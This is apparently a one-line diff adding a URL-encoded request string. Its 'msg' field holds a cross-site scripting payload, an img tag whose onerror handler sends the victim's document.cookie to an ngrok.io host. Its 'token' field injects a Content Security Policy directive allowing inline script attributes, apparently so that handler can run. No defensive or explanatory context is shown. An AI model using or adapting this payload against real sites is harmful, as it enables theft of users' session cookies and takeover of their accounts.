@@ -1,0 +1,1 @@
+msg=%3Cimg%20src%3D%22x%22%20onerror%3D%22document.location%3D%27https%3A%2F%2F680864674955.ngrok.io%2F%3F%27%2Bdocument.cookie%22%3E&token=%3B+script-src-attr+%27unsafe-inline%27
